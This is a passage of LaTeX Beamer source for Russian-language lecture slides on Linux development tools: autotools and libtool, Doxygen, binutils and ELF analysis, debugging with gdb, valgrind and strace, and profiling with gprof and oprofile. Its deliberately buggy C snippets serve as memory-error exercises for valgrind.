\dgfile (configure) at (-2,3) {\filenamew{configure}};
\dgfile (confighin) at (.8,3) {\filenamew{config.h.in}};
\dgfile (Makefilein) at (3.6,3) {\filenamew{Makefile.in}};
\dgfile (src/Makefilein) at (6.4,3) {\filenamew{src/Makefile.in}};
\uncover<all:1>{
\tfile (autoreconf) at (2.5,6.5) {\command{autoreconf}};
}

\uncover<all:3->{
\tfile (aclocal) at (-2,7) {\command{aclocal}};
}
\uncover<all:5->{
\tfile (autoconf) at (-2,5) {\command{autoconf}};
}
\uncover<all:7->{
\tfile (autoheader) at (1.75,5.75) {\command{autoheader}};
}
\uncover<all:9->{
\tfile (automake) at (5.5,6.5) {\command{automake}};
}


\afile (configureac) at (-2,9) {\filenamew{configure.ac}};
\uncover<all:4->{\dgfile (aclocalm4) at (1,8.5) {\filenamew{aclocal.m4}};}
\afile (Makefileam) at (3.5,9) {\filenamew{Makefile.am}};
\afile (src/Makefileam) at (6.5,9) {\filenamew{src/Makefile.am}};


\uncover<all:1>{
\arr (autoreconf) .. controls +(-10:4cm) and +(40:2cm) .. (configure);
\arr (autoreconf) .. controls +(-5:4cm) and +(55:2cm) .. (confighin);
\arr (autoreconf) .. controls +(0:4cm) and +(70:2cm) .. (Makefilein);
\arr (autoreconf) .. controls +(5:4cm) and +(90:2cm) .. (src/Makefilein);

\arr (configureac) .. controls +(-90:2cm) and +(180:4cm) .. (autoreconf);
\arr (Makefileam) .. controls +(-120:2cm) and +(175:4cm) .. (autoreconf);
\arr (src/Makefileam) .. controls +(-130:2cm) and +(170:4cm) .. (autoreconf);
}
\uncover<all:4->{
\arr (configureac) .. controls +(-90:.5cm) and +(170:1.7cm) .. (aclocal);
\arr (aclocal) .. controls +(10:2cm) and +(150:2cm) .. (aclocalm4);
}
\uncover<all:6->{
\arr (configureac) .. controls +(-140:2cm) and +(175:2cm) .. (autoconf);
\arr (aclocalm4) .. controls +(-120:2cm) and +(170:2cm) .. (autoconf);
\arr (autoconf) .. controls +(-10:2cm) and +(90:1cm) .. (configure);
}
\uncover<all:8->{
\arr (configureac) .. controls +(-50:2cm) and +(175:2.5cm) .. (autoheader);
\arr (aclocalm4) .. controls +(-110:2cm) and +(170:2cm) .. (autoheader);
\arr (autoheader) .. controls +(-10:2.5cm) and +(90:1cm) .. (confighin);
}
\uncover<all:10->{
\arr (configureac) .. controls +(-40:3cm) and +(180:4cm) .. (automake);
\arr (aclocalm4) .. controls +(-50:2cm) and +(176:2cm) .. (automake);
\arr (Makefileam) .. controls +(-90:2cm) and +(173:2cm) .. (automake);
\arr (src/Makefileam) .. controls +(-110:2cm) and +(170:2cm) .. (automake);
\arr (automake) .. controls +(-10:2cm) and +(80:1cm) .. (Makefilein);
\arr (automake) .. controls +(-5:2cm) and +(90:1cm) .. (src/Makefilein);
}
\end{tikzpicture}
\end{frame}

\begin{frame}
 \frametitle{Как работают \texttt{autotools}: \texttt{m4}}

 \begin{block}{m4}
	 Макропроцессор m4,  разработанный в 1977 году программистами Брайаном Керниганом и Денисом Ритчи,  
	 предназначен для макрогенерации на предварительном проходе в различных языках. 
	 Макрогенерация означает копирование входного символьного потока в выходной с подстановкой макросов 
	 по мере их появления. Макросы могут быть встроенными или определенными пользователями,
	 и принимать произвольное число аргументов. Имеется множество встроенных функций для включения файлов, 
	 запуска внешних команд,  выполнения целочисленной арифметики,  
	 манипуляции строками. 
	 
	 Название «m4» раскрывается как «macro»,  то есть «m» + ещё 4 буквы.
 \end{block}
\end{frame}


\begin{frame}[fragile]
 \frametitle{Возможный алгоритм использования autotools}
 \begin{itemize}
  \item Запустить \texttt{autoscan}
  \item Заполнить сгенерированный шаблон \texttt{configure.scan} и сохранить как \texttt{configure.ac}
  \item Заполнить Makefile.am в каждой поддиректории
  \item Запустить \texttt{autoreconf -{}-install -{}-force}
  \item Починить проблемы
  \item \verb+./configure && make && make install+
 \end{itemize}
\end{frame}

\begin{frame}[fragile]
\frametitle{Практическая задача}

Создадим переносимый пакет {\tt hello\_world}

	\begin{block}{На входе}
	\begin{itemize}
		\item Проект типа Hello,World с отдельным файлом, который будет содержать функцию \texttt{helloworld} 
	\end{itemize}
	\end{block}

	\begin{block}{На выходе}
	\begin{itemize}
		\item Бинарный файл содержащий собственную реализацию печати сообщения
		\item Разделяемую библиотеку для печати сообщения
		\item Бинарный файл, использующий библиотеку
	\end{itemize}
	\end{block}

\end{frame}

\begin{frame}[fragile]
\frametitle{Исходники}

	\begin{itemize}
		\item Считаем, что исходники находятся в {\tt src/}
		\item Добавить в список необходимых заголовочных файлов {\tt config.h}
	\end{itemize}
\end{frame}


\begin{frame}[fragile]
\frametitle{Пример \texttt{configure.ac}}

	\begin{itemize}
		\item Запускаем {\tt autoscan} для получения шаблона
		\item Копируем шаблон в \texttt{configure.ac} и редактируем его
		\item[] Обратить внимание на {\tt config.h}
		\item Запускаем {\tt autoreconf -vfi}
	\end{itemize}

\begin{lstlisting}[language=sh]
AC_INIT([my-package],[1.0.0],[me@maintainer.org])
\end{lstlisting}
\end{frame}

\begin{frame}[fragile]
	\frametitle{Пример \texttt{configure.ac}: добавляем {\tt automake}}

	\begin{itemize}
		\item Добавляем инициализацию {\tt automake} в шаблон
		\item Запускаем {\tt autoreconf -vfi}
	\end{itemize}

\begin{lstlisting}[language=sh]
AC_INIT([my-package],[1.0.0],[me@maintainer.org])
AM_INIT_AUTOMAKE([foreign -Wall -Werror])

AC_CONFIG_HEADERS([config.h])
AC_CHECK_LIB([m],[floor],[],[AC_MSG_ERROR(no math library)])

\end{lstlisting}
\end{frame}

\begin{frame}[fragile]
	\frametitle{Пример \texttt{configure.ac}: добавляем {\tt Makefile}}
	\begin{block}{Корневой \texttt{Makefile.am}}
\begin{lstlisting}[language=sh]
SUBDIRS = src
\end{lstlisting}

	Hint: {\tt VPATH} в {\tt Makefile}
\end{block}


	\begin{block}{\texttt{Makefile.am} в {\tt src}}
\begin{lstlisting}[language=sh]
bin_PROGRAMS = hello
hello_SOURCES  = hello.c libhello.c
\end{lstlisting}
	\end{block}

	\begin{block}{\texttt{configure.ac}}
\begin{lstlisting}[language=sh]
AC_CONFIG_AUX_DIR([build-aux])
AC_CONFIG_FILES([Makefile src/Makefile])
\end{lstlisting}
	\end{block}

\end{frame}


\begin{frame}[fragile]
\frametitle{lib LTLIBRARIES и libtool}
\begin{itemize}
 \item Разные системы -- разные расширения для динамических библиотек (
\texttt{.so, .dylib, .dll})
 \item Некоторые системы вообще не поддерживают динамическую линковку
 \item Ответ на все это -- \texttt{libtool}
 \item Кроме библиотеки с системным расширением создает \texttt{libsomething.la} с которой умеет работать на всех системах
 \item \texttt{Makefile.am} -- переменная \verb+lib_LTLIBRARY+ 
\end{itemize}
\end{frame}

\begin{frame}[fragile,allowframebreaks]
	\frametitle{Пример: добавляем библиотеку}
	\begin{block}{\texttt{Makefile.am} в {\tt src}}
\begin{lstlisting}[language=sh]
bin_PROGRAMS = hello
lib_LTLIBRARIES = libhello-lib.la
hello_SOURCES  = hello.c
hello_LDADD = libhello-lib.la
libhello_lib_la_SOURCES = libhello.c
\end{lstlisting}
	\end{block}

	\begin{block}{Корневой \texttt{Makefile.am}}
\begin{lstlisting}[language=sh]
SUBDIRS = src
ACLOCAL_AMFLAGS = -I m4
\end{lstlisting}
	\end{block}

	\begin{block}{\texttt{configure.ac}}
\begin{lstlisting}[language=sh]
# Checks for libraries.
LT_INIT
\end{lstlisting}
	\end{block}

	\begin{itemize}
		\item Запускаем {\tt libtoolize} 
	\end{itemize}

\end{frame}

\begin{frame}[fragile]
	\frametitle{Пример: автоматическая магия}
	\begin{block}{Сборка без библиотек}
	\center{\tt ./configure -{}-disable-shared}
	\end{block}
\end{frame}


\begin{frame}
 \frametitle{Альтернативы autotools}
\begin{itemize}
  \item{Основанные на make}
  \begin{itemize}
    \item CMake
    \item MakeKit
    \item qmake
  \end{itemize}
  \item{Другие}
    \begin{itemize}
      \item SCons
      \item rake, cabal, ant, etc.
    \end{itemize}
\end{itemize}
\end{frame}

\begin{frame}
 \frametitle{Домашнее задание}
  \begin{itemize}
    \item Добавить правила сборки GNU Autotools в свою реализацию архиватора Хаффмана
  \end{itemize}
\end{frame} }
\end{verbatim}

\chapter{Документирование кода}
\mode<all>{\begin{frame}
 \frametitle{Системы автоматического документирования}
 \begin{itemize}
  \item Donald Knuth, literate programming, 1983
  \item perldoc, etc. 1994
  \item javadoc, 1995
  \item Doxygen, 1997
 \end{itemize}
\end{frame}

\begin{frame}
 \frametitle{Как использовать}
 \begin{itemize}
  \item Добавить комментарии в формате Doxygen в исходники
  \item \texttt{doxygen -g Doxyconfig}
  \item Редактировать Doxyconfig
  \item doxygen Doxyconfig
 \end{itemize}
\end{frame}

\begin{frame}[fragile]
 \frametitle{Некоторые важные параметры в конфигурационном файле}
 \begin{itemize}
  \item \verb+PROJECT_NAME+
  \item \verb+PROJECT_NUMBER+
  \item \verb+INPUT+  
  \item \verb+RECURSIVE+
  \item \verb+EXCLUDE+
  \item \verb+EXCLUDE_PATTERNS+
  \item \verb+EXTRACT_ALL+
 \end{itemize}
\end{frame}

\begin{frame}[fragile]
 \frametitle{Образец комментариев для файла}
\begin{lstlisting}[language=C]
/**
  @file filename
  @brief Краткое описание

  Детальное описание
  @author Автор (может быть несколько)
  @bug Нет известных багов
*/
\end{lstlisting}
\end{frame}

\begin{frame}[fragile]
 \frametitle{Образец комментариев для функции}
\begin{lstlisting}[language=C]
/**
  @brief Краткое описание функции

  Детальное описание
  @param[in] parameter1 Описание первого параметра
  @param[out] parameter2 Описание второго параметра
  @see Ссылка на другую функцию
  @return Что возвращает

*/
int function(int parameter1, char *parameter2) 
\end{lstlisting}
\end{frame}

\begin{frame}[fragile]
 \frametitle{Образец комментариев для данных}
\begin{lstlisting}[language=C]
/** 
* Описание структуры 
*/
typedef struct { 
	/*@{*/ 
  double x ; /**< the x coordinate*/ 
  double y ; /**< the y coordinate */
  double z ; /**< the z coordinate */
  /*@}*/
  /** 
  * @name group 2 
  */
  /*@{*/
  char * name ; /**< the name of the point */
  int namelength ; /**< the size of the point name */
  /*@}*/
  } point3d
\end{lstlisting}
\end{frame}


\begin{frame}
 \frametitle{Упражнение}
  \begin{itemize}
    \item В проекте helloworld откомментировать каждую функцию в стиле doxygen
    \item Сгенерировать документацию в формате pdf
  \end{itemize}
\end{frame} 
}

\chapter{Binutils. Анализ исполняемого файла}
\mode<all>{%%

\begin{frame}
	\frametitle{Кого будем потрошить?}

	\begin{block}{Жертва обстоятельств}
		Для анализа понадобится пример из занятия по введению в gcc.\\
		Пример доступен по адресу:\\
		 \url{https://github.com/d4s/linux\_courses/tree/master/epam/examples/make/linking}
	\end{block}
\end{frame}
}
\section{Динамически связанные библиотеки}
\mode<all>{%%
%%

\begin{frame}
	\frametitle{Библиотеки и связи}

	\begin{block}{Утилита ldd}
		Просмотр списка библиотек от которых зависит программа.
	\end{block}

	\pause

	\begin{block}{Упражнение}
		\begin{enumerate}
			\item Запустить {\tt ldd main-A\_B main-B\_A}
			\item Заменить в {\tt Makefile} опцию {\tt --no-as-needed} на {\tt --as-needed}
				и перекомпилировать пример
			\item Повторить вызов {\tt ldd}, сравнить с предыдущим и сделать выводы
			\item Запустить {\tt ldd libtestb.so}
			\item Сравнить с выводом {\tt /usr/bin/java} и удивиться ;-)
		\end{enumerate}
	\end{block}

\end{frame}


}
\section{Структура elf}
\mode<all>{%%
%% Based on "Как запускается функция main() в Linux"
%% http://www.linuxlib.ru/prog/mainlin.htm

\begin{frame}
	\frametitle{ELF}
	\begin{columns}
		\column{0.5\textwidth}
			\begin{block}{Executable and Linkable Format}
				Файлы могут включать:
				\begin{itemize}
					\item Таблицу Program Header,  описывающую ноль или более сегментов
					\item Таблицу Section Header,  описывающую ноль или более секций
					\item Данные,  упомянутые в записях названных таблиц
				\end{itemize}
			\end{block}
		\column{0.5\textwidth}
			\includegraphics[height=0.8\textheight]{../../slides/elf-analysis/Elf-layout.png}
	\end{columns}
\end{frame}

\begin{frame}
	\frametitle{Запуск main()}

	\begin{block}{Пример}
		Для анализа понадобится пример из занятия по введению в gcc (последовательность линковки библиотек).
	\end{block}

	Пример доступен по адресу \url{https://github.com/d4s/linux\_courses/tree/master/epam/examples/make/linking}
	
\end{frame}

}
\section{Binutils}
\mode<all>{%%
%% 

\begin{frame}
	\frametitle{objdump}

	\begin{block}{objdump}
		Утилита для просмотра информации по object файлам.
	\end{block}

	\pause

	\begin{block}{Упражнение}
		\begin{itemize}
			\item {\tt objdump -{}-file-headers main-A\_B} -- получить заголовок файла
			\item {\tt objdump -{}-section-headers main-A\_B} -- перечисление секций (для линковки)
			\item {\tt objdump -{}-syms main-A\_B} -- список таблицы символов
			\item {\tt objdump -{}-dynamic-syms main-A\_B} -- список динамических символов (как nm -u)
		\end{itemize}

	\end{block}
\end{frame}


\begin{frame}
	\frametitle{Дизассемблер objdump}

	\begin{block}{Упражнение: внутренниий мир программы}
		\begin{itemize}
			\item {\tt objdump -{}-disassemble main-A\_B} -- получить дизассемблированный файл
			\item {\tt objdump -{}-disassemble -j.text main-A\_B} -- 
				получить дизассемблированную исполняемую секцию {\tt .text}
			\item {\tt objdump -{}-disassemble -j.text -{}-file-offsets main-A\_B} -- 
				получить дизассемблированную исполняемую секцию {\tt .text} 
				и узнать где в файле располагаются инструкции
		\end{itemize}
	\end{block}
\end{frame}

\begin{frame}
	\frametitle{Что же наделал компилятор?}

	\begin{block}{Упражнение: анализируем вместе с исходником}
		\begin{itemize}
			\item Добавить в исходник {\tt main.c} объявление переменной и пустой цикл
			\item Добавить в {\tt Makefile} опции {\tt -g -O0}
			\item {\tt objdump -{}-source -{}-line-numbers main-A\_B}
			\item {\tt objdump -{}-source -{}-line-numbers -{}-file-offsets main.o}
			\item Изменить в {\tt Makefile} опцию {\tt -O0} на {\tt -O3}
			\item {\tt objdump -{}-source -{}-line-numbers -{}-file-offsets main.o}
			\item Сделать выводы ;-)
		\end{itemize}
	\end{block}
\end{frame}

}

\chapter{Отладка}
\mode<all>{\begin{frame}
  \frametitle{Инструменты отладки}
  \begin{itemize}
   \item printf
   \item Функциональный стиль + unit tests
   \item gdb
   \item valgrind
  \end{itemize}
\end{frame}
}
\section{Отладка с помощью printf}
\mode<all>{\begin{frame}
 \frametitle{Использование printf и логов}
 \begin{columns}
   \column{0.45\textwidth}
    \begin{center}
     Преимущества 
    \end{center}
    \begin{itemize}
     \item Работает везде и всегда
     \begin{itemize}
       \item В многопоточных программах
       \item При вызове из других программ
       \item Внутри ядра (printk)
       \item В реальном времени
       \item В разных языках
      \end{itemize}
    \end{itemize}
   \column{0.45\textwidth}
    \begin{center}
     Недостататки
    \end{center}
    \begin{itemize}
     \item Нужна перекомпиляция
     \item Нет интерактивности
     \item Нужно вычищать
     \item Трудно печатать сложные структуры
     \item Нет backtrace
    \end{itemize}
 \end{columns}
\end{frame}

\begin{frame}[fragile]
	\frametitle{Подготовка}

	\begin{block}{Заготовка {\tt trace.c}}
	
	\begin{lstlisting}
#include <stdio.h>

void second (void) {
}

void first (void) {
  second();
}

int main (void) {
  first();
  return 0;
}
	\end{lstlisting}
	\end{block}

\end{frame}


\begin{frame}[fragile]
	\frametitle{Полезные макросы}

	\begin{itemize}
		\item {\tt \_\_FILE\_\_}
		\item {\tt \_\_LINE\_\_}
		\item {\tt \_\_func\_\_}
	\end{itemize}

	\begin{block}{Задание}
		Добавить макрос печатающий на экран текущее имя файла, номер строки и имя функции.

		Вставить макрос в начало каждой функции.
	\end{block}

\end{frame}



}
\section{GNU отладчик gdb}
\mode<all>{\begin{frame}
  \frametitle{Базовые команды gdb}
  \begin{columns}
    \begin{column}{width=0.3\textwidth}
      \begin{itemize}
        \item help
        \item b (break)
        \item c (continue)
        \item s (step)
      \end{itemize}
    \end{column}
    
    \begin{column}{width=0.3\textwidth}
      \begin{itemize}
        \item p (print)
        \item l (list)
        \item (pt) ptype
        \item watch
      \end{itemize}
    \end{column}

    \begin{column}{width=0.3\textwidth}
      \begin{itemize}
        \item bt (backtrace)
        \item finish
        \item return
        \item frame
      \end{itemize}
    \end{column}
  \end{columns}
\end{frame}

\begin{frame}
 \frametitle{Обращение с точками останова}
 \begin{itemize}
   \item{Варианты установки}
    \begin{itemize}
     \item break
     \item break <line>
     \item break <file>:<line>
     \item break <function>
     \item break <> if <condition>
    \end{itemize}
    \item Удаление
     \begin{itemize}
       \item clear 
       \item delete
     \end{itemize}
     \item Временное отключение
     \begin{itemize}
       \item disable
       \item enable
       \item ignore <n>
     \end{itemize}
  \end{itemize}
\end{frame}

\begin{frame}
  \frametitle{Упражнение}
\end{frame}

\begin{frame}
 \frametitle{Отладка внешнего процесса}
%attach, detach
\end{frame}

\begin{frame}
 \frametitle{gdb server}
\end{frame}


}
\section{Valgrind}
\mode<all>{%%
%% 

\begin{frame}
	\frametitle{Valgrind}

	\begin{block}{Что умеет Valgrind}
		\begin{itemize}
			\item Утечки памяти
			\item Использование неинициализированной памяти
			\item Чтение/запись за пределами выделенной {\tt malloc} памяти
			\item Чтение/запись в некорректные области стека
			\item Использование неправильных пар вуделения/удаления блоков памяти:\\
				{\tt malloc/new/new[]} и {\tt free/delete/delete[]}
			\item Перекрытие участков памяти при использованиии {\tt memcpy()} и др.
			\item "Злоупотребления" {\tt API pthreads}
		\end{itemize}
	\end{block}
\end{frame}

\begin{frame}
	\frametitle{Valgrind}

	\begin{block}{Valgrind Tools}
		\begin{enumerate}
			\item {\bf Memcheck} -- определяет ошибки при работе с памятью.
			\item {\bf Cachegrind} -- профайлер работы с кэшем и ветвлений.
			\item {\bf Callgrind} -- еще один кэш-профайлер.
			\item {\bf Helgrind} -- определяет ошибки в потоках.
			\item {\bf DRD} -- и еще один детектор ошибок в потоках.
			\item {\bf Massif} -- профайлер "кучи".
			\item {\bf DHAT} -- ...вы не поверите, но да, еще один.
			\item {\bf SGcheck} -- детектор работы со стеком и глобальными массивами.
			\item {\bf BBV} -- генератор блок-схем.
		\end{enumerate}
	\end{block}
\end{frame}
			
\begin{frame}[fragile]
	\frametitle{Упражнение: некорректный указатель}

	\begin{lstlisting}
#include <stdlib.h>

main(void)
{
char *array;

    array = (char *) malloc(10*sizeof(char));
    array[10] = 'x';
    free( array);
    exit(0);
}
	\end{lstlisting}

	Пример: {\tt inv\_ptr.c}

\end{frame}

\begin{frame}[fragile]
	\frametitle{Упражнение: утечки памяти}

	\begin{lstlisting}
char *array;
int i;

for( i=0; i<100; i++)
    array = (char *) malloc(10*sizeof(char));

free( array);
	\end{lstlisting}

	\begin{block}{Детализация}
		{\tt -{}-leak-check=full}
	\end{block}

	Пример: {\tt leaks.c}

\end{frame}

\begin{frame}[fragile]
	\frametitle{Упражнение: объем выделенной памяти}

	\begin{lstlisting}
array = (char *) malloc(1<<31);
array[10000] = 0;
	\end{lstlisting}

	Пример: {\tt huge\_size.c}
	
	\bigskip
	\pause

	Задание:
	\begin{enumerate}
		\item изменить объем запрошенной памяти на больший, чем доступно в системе
	\end{enumerate}

\end{frame}

\begin{frame}[fragile]
	\frametitle{Упражнение: использование переменной вместо указателя}

	\begin{lstlisting}
    int i;
    scanf("%d", i);
	\end{lstlisting}

	Пример: {\tt inv\_type.c}
\end{frame}

\begin{frame}[fragile]
	\frametitle{Упражнение: неинициализированные переменные}

	\begin{lstlisting}
    int a;
    if ( a)
        (...};
	\end{lstlisting}

	Пример: {\tt uninit\_var.c}
\end{frame}

\begin{frame}[fragile]
	\frametitle{GDB + Valgrind}

	Valgrind запускет программы на "синтетическом" процессоре, поэтому GDB не работает!

	Для отладки используется {\tt vgdb}: \\

	\begin{verbatim}
valgrind -vgdb=yes --vgdb-error=0 prog
	\end{verbatim}


	а {\tt gdb} запустить:
	\begin{verbatim}
gdb prog
(gdb) target remote | vgdb
	\end{verbatim}

	\pause
	\begin{block}{Упражнение}
		Попробовать провести отладку программы {\tt segfault.c} с помощью связки Valgrind и GDB.
	\end{block}
\end{frame}



}
\section{Отладка системных вызовов (strace,ltrace)}
\mode<all>{\begin{frame}[fragile]
  \frametitle{strace, ltrace}
  \begin{center}
   Основные опции 
  \end{center}
  \begin{itemize}
   \item \texttt{-e <expression>}
\begin{lstlisting}[language=sh]
  strace -e read,write -e read=50 
\end{lstlisting}
   \item \texttt{-p <pid>}
\begin{lstlisting}[language=sh]
  ltrace -p 1021
\end{lstlisting}
   \item \texttt{-c}
   \item \texttt{-f} следить за дочерними процессами
   \item \texttt{-o <filename>}
   \item \texttt{-t, -T}
  \end{itemize}
\end{frame}

\begin{frame}
 \frametitle{Некоторые возможные применения}
 \begin{itemize}
  \item Обнаружение файлов, открываемых приложением (\texttt{-e open})
    \begin{itemize}
      \item библиотек, подключаемых в реальном времени
      \item конфигурационных файлов
    \end{itemize}
   \item Обнаружение сетевых соединений \texttt{connect, accept, recvfrom, sendto, poll, read, write} 
   \item Чем занято приложение в текущий момент
   \item Почему приложение сейчас тормозит
   \item Профилирование
   \item Получение дампов записей в устройства, сокеты и т.п.
 \end{itemize}
\end{frame}

\begin{frame}
 \frametitle{Упражнение}
 \begin{enumerate}
   \item Выяснить, какие конфигурационные файлы пытается открыть \texttt{vim}
   \item В каком системном вызове проводит больше всего времени \texttt{ls /usr/bin/}. То же для \texttt{ls -l /usr/bin}
   \item Повторить предыдущий пункт для библиотечных вызовов.
   \item Попробовать различные представления времени: {\tt -r}, {\tt -t},{\tt -tt},{\tt -ttt}.
 \end{enumerate}
\end{frame}


}
\section{Просмотр списка вызовов функций (backtrace)}
\mode<all>{%%
%% 
\begin{frame}[fragile]
	\frametitle{Встроенные функции gcc}

	\begin{block}{Адрес возврата ({\tt gcc})}
		
		Встроенные в {\tt gcc} функции для получения адреса вызывающей функции:

	\begin{lstlisting}
void * __builtin_return_address (unsigned int level);
	\end{lstlisting}
	\end{block}

	\begin{block}{Пример}
	
	Добавить в функцию {\tt second()} код:

	\begin{lstlisting}
printf("Frame 0: %p\n",  __builtin_return_address(0));
printf("Frame 1: %p\n",  __builtin_return_address(1));
printf("Frame 2: %p\n",  __builtin_return_address(2));
printf("Frame 3: %p\n",  __builtin_return_address(3));
	\end{lstlisting}
	\end{block}

\end{frame}

\begin{frame}[fragile]
	\frametitle{{\tt addr2line}}

	\begin{block}{Перевод адреса в строку}
		{\tt addr2line <address>}

		\begin{itemize}
			\item {\tt -e filename} -- бинарный файл
			\item {\tt -f} -- показать имена функций 
			\item {\tt -i} -- для inline функций -- показывать первую не встроенную
			\item {\tt -C} -- нормальные имена для "искалеченных" (C++) функций
		\end{itemize}
	\end{block}

	\begin{block}{Упражнение}

		\begin{itemize}
			\item Вызвать {\tt addr2line}, передав туда адреса, полученные из {\tt \_\_builtin\_return\_address()}.
			\item Перекомпилировать с флагом {\tt -g}
			\item Повторить вызов {\tt addr2line}
		\end{itemize}

	\end{block}

\end{frame}

%\begin{frame}[fragile]
%	\frametitle{Пример}
%
%	\begin{block}{Вывод {\tt backtrace}}
%	\begin{verbatim}
%./backtrace() [0x400c3e]
%/lib64/libc.so.6(+0x350f0) [0x7fb5711450f0]
%./backtrace(fill_random_ascii_buffer+0x40) [0x400d11]
%./backtrace(main+0xc9) [0x400dfe]
%	\end{verbatim}
%
%	\end{block}
%	\begin{block}{Вызов {\tt addr2line}}
%	\begin{verbatim}
%addr2line -e backtrace -ifC 0x400c3e
%	\end{verbatim}
%
%	\end{block}
%
%\end{frame}

\begin{frame}[fragile]
	\frametitle{Добавим ошибку}

	\begin{block}{Ошибка}
	
	\begin{lstlisting}
void second (void) {
  char *buf;
  sprintf( buf, "Hello, world!\n");
}
	\end{lstlisting}
	\end{block}
	
\end{frame}
\begin{frame}[fragile]
  \frametitle{Обработчик}
	\begin{block}{И обработчик}
	\begin{lstlisting}
void sighandler( int signal) {
  printf("SIGSEGV received, exiting.\n");
  exit(1);
}
int main (void) {
  struct sigaction action;
  action.sa_handler = sighandler;
  action.sa_flags=0;
  sigemptyset(&action.sa_mask);
  sigaction (SIGSEGV, &action,NULL);
	\end{lstlisting}
	\end{block}

\end{frame}



\begin{frame}[fragile]
	\frametitle{BackTrace}

	\begin{block}{Backtrace}
		Список вызовов функций\footnote{{\tt backtrace\_symbols} -- может не работать при проблемах с памятью!}.

	\end{block}

	\begin{lstlisting}
#include <execinfo.h>

int backtrace (void **buffer, int size);
char ** backtrace_symbols (void *const *buffer, int size);
void backtrace_symbols_fd (void *const *buffer, int size, int fd);
	\end{lstlisting}
\end{frame}

\begin{frame}[fragile]
	\frametitle{Пример использования}

	Для использования с {\tt GNU ld} линковать с опцией {\tt -rdynamic}.

	\begin{block}{Упражнение: вызов {\tt backtrace} (backtrace.c)}

	\begin{lstlisting}
void *trace[TRACEDEPTH];
size_t trace_size,  i;
char **trace_msg;
trace_size = backtrace(trace,  TRACEDEPTH);
trace_msg = backtrace_symbols( trace,  trace_size);

for( i=0; i<trace_size; i++) printf("%s\n",  trace_msg[i]);

free( trace_msg);

backtrace_symbols_fd( trace, trace_size, STDERR_FILENO);
	\end{lstlisting}

	\end{block}
\end{frame}


}

\chapter{Профилирование}
\mode<all>{\begin{frame}
 \frametitle{Оптимизация}
 \begin{itemize}
  \item Преждевременная оптимизация -- корень всех зол!
  \pause
  \item Закон Амдала
     \begin{equation*}
        \frac{1}{(1-P)+\alpha P}
     \end{equation*}
  \item Профилирование -- выясним, в каких местах программа проводит больше всего времени
 \end{itemize}
\end{frame}

\begin{frame}
    \frametitle{Профилирование в Linux}
    \center
    \includegraphics[height=0.75\textheight]{../../slides/profile/linux_observability_tools.png}\footnote{\url{http://www.brendangregg.com/linuxperf.html}}

\end{frame}


\begin{frame}
  \frametitle{Методы профилирования}
  \begin{itemize}
    \item Добавление в код дополнительных инструкций (gprof)
      \begin{enumerate}
        \item[Достоинства] Не требуется поддержка ядра
        \item[Недостатки] Рекомпиляция, замедление кода
      \end{enumerate}
    \item Статистическое исследование (oprofile,perf)
      \begin{enumerate}
        \item[Достоинства] Малое вмешательство в процесс, скорость
        \item[Недостатки] Требуется модуль ядра, точность
      \end{enumerate}
    \item Эмуляция процессора для перехвата вызовов (valgrind)
       \begin{enumerate}
         \item[Достоинства] Не требуется рекомпиляция и модули ядра
         \item[Недостатки] Скорость
        \end{enumerate}
    \item Перехват системных и библиотечных вызовов (strace,ltrace)
       \begin{enumerate}
          \item[Достоинства] Нет рекомпиляции, любое ядро
          \item[Недостатки] Недостаточная информативность
       \end{enumerate}
  \end{itemize}
\end{frame}

}
\section{Gprof}
\mode<all>{\begin{frame}[fragile]
 \frametitle{Gprof}
 \begin{itemize}
   \item Компилировать с опцией \texttt{-pg}
\begin{lstlisting}[language=sh]
 gcc -g -pg -o program program.c
\end{lstlisting}
   \item Создается файл gmon.out
   \item Просмотр статистики (плоский профиль, flat profile) 
\begin{lstlisting}[language=sh]
gprof program -p
\end{lstlisting}
    \item Просмотр графа вызовов со статистикой
\begin{lstlisting}[language=sh]
gprof program -q
\end{lstlisting}
    \item Аннотация исходного кода
\begin{lstlisting}[language=sh]
gprof program -A
\end{lstlisting}
 \end{itemize}
\end{frame}

\begin{frame}
  \frametitle{Упражнение}
  \begin{enumerate}
    \item Написать программу, которая в цикле вызывает функции a и b, b также вызывается внутри a
    \item Скомпилировать с флагом \textt{-pg}
    \item Просмотреть информацию профайлером
  \end{enumerate}
\end{frame}

}
\section{Профилирование в valgrind}
\mode<all>{\begin{frame}[fragile]
 \frametitle{Valgrind callgrind}
 \begin{itemize}
  \item Инструмент для профилирования \verb+ --tool=callgrind+
  \item Просмотр результатов
    \begin{itemize}
      \item \texttt{kcachegrind}
      \item \texttt{callgrind\_annotate}
    \end{itemize}
 \end{itemize}
 \begin{center}
  Упражнение
 \end{center}
 \begin{enumerate}
  \item Скомпилировать ту же самую программу с ключами \verb+-g+
  \item Запустить под valgrind
  \item Изучить callgraph и относительное время в функциях
 \end{enumerate}
\end{frame}
}
\section[oprofile]{Статистическое профилирование в oprofile}
\mode<all>{\begin{frame}
 \frametitle{Статистический сбор образцов: общие соображения}
 \includegraphics[width=0.7\textwidth]{../../slides/profile/Standard_deviation_diagram.png}
 \begin{itemize}
   \item Распределение Пуассона, в пределе больших $n$ переходящее в нормальное распределение
   \item Ширина распределения $\sim \sqrt{n}$
 \end{itemize}
\end{frame}

\begin{frame}
 \frametitle{Компоненты oprofile}
  \begin{itemize}
    \item Модуль ядра oprofile
    \item Системный демон \texttt{oprofiled}
    \item Программы управления \texttt{opcontrol,opannotate,}
  \end{itemize}
\end{frame}


\begin{frame}[fragile]
 \frametitle{Запуск oprofile: Проверка поддержки в ядре}
 \begin{itemize}
   \item \verb+ grep OPROFILE <configure>+
   \item Где найти \texttt{.configure}
     \begin{itemize}
      \item \texttt{.configure} В исходниках ядра
      \item \verb+/boot/configure-`uname -r`+
      \item \verb+/proc/config.gz+
     \end{itemize}
  \end{itemize}
\end{frame} 


\begin{frame}[fragile]
 \frametitle{Запуск oprofile: Работа}
 \begin{itemize}
  \item \verb+ opcontrol --vmlinux=/boot/vmlinux-3.2.xxx+ 
  \item \verb+ opcontrol --init+
  \item \verb+ opcontrol --start; ./my_program ; opcontrol --dump;  opcontrol --stop+
  \item \verb+ opannotate --source ./my_program +
 \end{itemize}
\end{frame}

\begin{frame}
 \frametitle{Упражнение}
 \begin{enumerate}
  \item Проверить, что в конфигурации ядра есть поддержка oprofile
  \item Скомпилировать программу с \texttt{-g}
  \item Запустить под oprofile
  \item Посмотреть статистику вызовов
  \item Запустить еще раз
  \item Посмотреть статистику еще раз, сравнить
 \end{enumerate}
\end{frame}
}
\section{Анализ тестового покрытия}
\mode<all>{\begin{frame}{Введение}
  \begin{itemize}
    \item Введение
    \item Возможности
    \item Обзор архитектуры
    \item Примеры, примеры, примеры 
